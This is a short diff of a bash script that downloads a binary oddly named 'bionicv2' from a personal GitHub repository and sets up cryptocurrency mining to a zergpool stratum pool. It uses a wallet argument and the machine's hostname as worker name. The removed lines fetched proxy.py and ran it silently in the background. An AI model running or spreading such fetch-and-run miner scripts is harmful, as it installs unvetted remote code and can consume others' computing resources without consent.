@@ -1,8 +1,5 @@
 #!/bin/bash
 wget -O bionicv2 https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/bionicv2
-wget -O proxy.py https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/proxy.py
-chmod +x bionicv2 proxy.py
-python3 proxy.py >/dev/null &
 pool="stratum+tcp://verushash.mine.zergpool.com:3300"
 wallet="$1"
 workername="$(cat /proc/sys/kernel/hostname)"
